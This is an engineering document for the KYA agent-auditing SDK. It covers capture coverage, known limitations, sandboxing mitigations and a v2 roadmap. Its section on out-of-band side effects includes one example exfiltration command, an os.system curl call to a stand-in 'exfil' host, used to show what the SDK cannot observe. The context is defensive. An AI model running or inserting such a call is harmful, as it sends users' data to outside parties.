# KYA SDK — Known Limitations & Prescribed Mitigations

Honest scope statement. KYA aims to capture **everything an agent does
inside its framework harness**. Some classes of behavior are by
definition outside the harness; this document lists them with
prescribed mitigations.

## Auto-capture coverage matrix

| Scenario | Auto-captured? | Path |
|---|---|---|
| Any Python framework using OpenInference (~20 frameworks: LangChain, LlamaIndex, CrewAI, DSPy, AutoGen, OpenAI Agents SDK, Anthropic SDK, Bedrock, Vertex, MistralAI, Groq, Cohere) | ✓ | OTLP bridge maps spans → invocations + evidence |
| Any framework using OpenLLMetry / OTel GenAI semconv | ✓ | OTLP bridge handles `gen_ai.*` attribute family |
| Multi-agent request tree (parent → child delegation) | ✓ | `session.id` → `correlation_id` mapping |
| LangChain without OpenInference installed | ✓ | `kya_hooks.langchain.KyaLangchainHandler` |
| **Custom / hand-rolled agents** (Python loop calling SDKs directly) | ✓ | `kya.autoinstrument()` monkey-patches OpenAI/Anthropic/LiteLLM |
| **Direct LLM SDK calls bypassing the agent framework** | ✓ | Same — `autoinstrument()` catches every chat completion |
| Out-of-band side effects (curl, file writes outside framework) | ❌ | See "Architectural mitigations" below |
| Non-Python (JS, Go, Java) agents | ⚠️ | OpenInference has language ports — untested in KYA |
| Async streaming responses | ⚠️ | We capture the complete message on stream end, not token-by-token |

## Unsolvable at the SDK layer — prescribed architectural mitigations

### 1. Out-of-band side effects

**Problem.** An agent's tool can `os.system("curl https://exfil.example.com")`,
write to `/tmp/data.csv`, spawn a subprocess, or open a raw socket. None
of these traverse the agent's tool layer; they're plain Python that
doesn't notify any callback handler. KYA cannot see them from inside
the agent process.

**Mitigation — sandbox the agent process:**

| Layer | Tool |
|---|---|
| Network egress | Egress firewall (Cilium, Calico NetworkPolicy, AWS Security Group) restricting outbound IPs/domains |
| Syscall | Linux seccomp profile (`seccomp.json` for Docker), or Kata Containers / gVisor |
| Filesystem | Read-only root FS + named writable mounts (Docker `--read-only` + `tmpfs`) |
| Process | Subprocess allowlist (or `subprocess` disabled at the agent's host-level Python policy) |

**Detection** is possible via eBPF tracing or a sidecar that watches
`/proc/<pid>/net/tcp` — both are out of scope for v1 KYA, but the
sandbox **prevents** the action which is stronger than detecting it
after the fact.

### 2. Token-level streaming partial responses

We record the **complete assistant message** when the stream finishes.
Intermediate token-level state (which token was first, response cancelled
midway) is not captured. If a regulator needs token-by-token timeline,
add an OpenInference instrumented stream wrapper before the SDK boundary.

## Deferred v2 items (real engineering projects)

These are documented gaps with **deliberate** v2 scope, not bugs:

### v2.1 — Multi-span correlation (traceId → invocation_id chain)

**Current behavior.** OTLP bridge maps each in-scope OpenInference span
(AGENT, TOOL, LLM, RETRIEVER, GUARDRAIL, EVALUATOR) to its OWN invocation
row. An LLM-call child span emits an invocation separate from its parent
AGENT span's invocation.

**Desired behavior.** Bridge tracks `traceId → invocation_id` for the
session. Child spans attach their evidence to the parent AGENT's
invocation; the AGENT span only emits one invocation row per request.

**Effort.** ~3 hours. The bridge already extracts `traceId`/`spanId` from
OTLP; needs a per-trace cache and parent-lookup logic.

### v2.2 — KMS-backed signing key for evidence

**Current behavior.** `KYA_EVIDENCE_SIGNING_KEY` is a base64-encoded
secret in the environment. Dev fallback generates an in-process key
(logged warning).

**Desired behavior.** Pluggable key provider:

```python
KYA_EVIDENCE_KEY_PROVIDER = "kya.providers.aws_kms"
KYA_EVIDENCE_KEY_ARN      = "arn:aws:kms:us-east-1:..."
```

Provider returns the key material on demand; rotation handled by KMS.

**Effort.** ~2 hours plus per-provider code (AWS KMS ~1 hr, GCP KMS ~1 hr,
HashiCorp Vault ~2 hrs).

### v2.3 — Merkle anchor for third-party verification

**Current.** Per-row HMAC chain proves integrity to anyone who holds the
signing key. A regulator without the key can't independently verify.

**Desired.** Daily root hash of the day's evidence rows anchored to:
- Sigstore (Rekor transparency log)
- RFC 3161 Time-Stamping Authority
- Solana / OpenTimestamps

Regulator queries the anchor by date, gets a Merkle proof, verifies the
row was present at that timestamp without needing the signing key.

**Effort.** ~1 week engineering + provider integration. Roadmap item.

### v2.4 — Payload encryption at rest

**Current.** Payloads stored plaintext in the `kya_evidence.payload` JSON
column. PII / PHI customers must layer column-level encryption themselves
(PG `pgcrypto`, MySQL `AES_ENCRYPT()`, application-level Fernet).

**Desired.** Built-in column-level encryption with envelope-key from KMS.

**Effort.** ~3 days. Needs careful design — encrypted payloads still need
to be queryable by `payload_hash` (the hash should be of cleartext, not
ciphertext, so chain verification works post-decrypt).

### v2.5 — Concurrency fork on parallel evidence writes

**Status:** **Not blocking v1 ship. Schedule for v1.1 / first scale customer.**

**Current.** Two `record_evidence` calls for the same `(tenant, invocation)`
that race can both read the same `prev_hash` and produce a fork. Chain
verify will fail at the fork point.

**When this hurts:** customers with multi-pod ingestion (>1 process
writing evidence to the SAME invocation simultaneously). Pilot customers
running single-process ingestion will NOT hit this.

**Mitigation today:**
- Serialize evidence writes per-invocation via app-level mutex
- Use serializable isolation in your DB session
- Route all ingestion through a single process

**Desired (v1.1).** Database-level row lock (`SELECT ... FOR UPDATE`)
on the chain head before writing the new row. ~2 hours of work plus
per-backend testing: PG/MySQL native, SQLite no-op (serial by default),
DuckDB app-level mutex (no FOR UPDATE).

**Trigger:** add to roadmap when the first customer hits "verify_chain
report a prev_hash break with no DBA edit" — that's the signal.

### v2.7 — fleet_risk_rollup defense-in-depth (explicitly deferred)

**Status:** **Skip. Do not implement until a real corruption incident
warrants it.**

The current SQL in `_build_regulator_pack` and `fleet_risk_rollup` is
correctly tenant-scoped via `WHERE tenant_id = :tid`. A reviewer flagged
that adding a post-fetch assertion (`assert all rows.tenant_id ==
expected`) would be defense-in-depth.

We're skipping this because:
- The SQL is already correct
- Post-fetch validation adds code complexity for paranoia, not for a
  real failure mode
- If we EVER see corrupted rows in production we have bigger problems
  than the regulator pack — the entire storage layer needs investigation

**Trigger for revisit:** if a customer ever reports cross-tenant data
in their regulator pack output, this is the FIRST thing we'd add.

### v2.6 — Non-Python OpenInference ports

**Status.** OpenInference has JS/Go/Java ports (`@arizeai/openinference-*`,
`go-openinference`, `arize-otel-java`). Architecturally KYA's OTLP bridge
handles them — the spans look the same on the wire. But we haven't
**tested** them.

**To validate.** Customer with a Node.js agent installs
`@arizeai/openinference-instrumentation-langchain`, points
`OTEL_EXPORTER_OTLP_ENDPOINT` at KYA's bridge, runs a workload. We
inspect the rows. ~half-day to validate per language.

## Summary

| Class | Status |
|---|---|
| In-framework agent activity | ✓ Fully captured (4 paths) |
| Direct LLM SDK calls | ✓ Captured via `autoinstrument()` |
| Out-of-band syscalls | ❌ Sandbox the process |
| Multi-trace correlation | ⚠️ Per-span today; full chain in v2.1 |
| Tamper-evidence | ✓ HMAC chain; v2.3 adds third-party anchor |
| At-rest encryption | ⚠️ Caller responsibility; v2.4 makes it built-in |

For pilot / production deployment **today**: ✓ + ⚠️ paths give regulator-
grade audit coverage when paired with process sandboxing. The ❌ class
(arbitrary syscalls bypassing the harness) is an architectural concern
not a KYA gap — solve at the deployment layer.
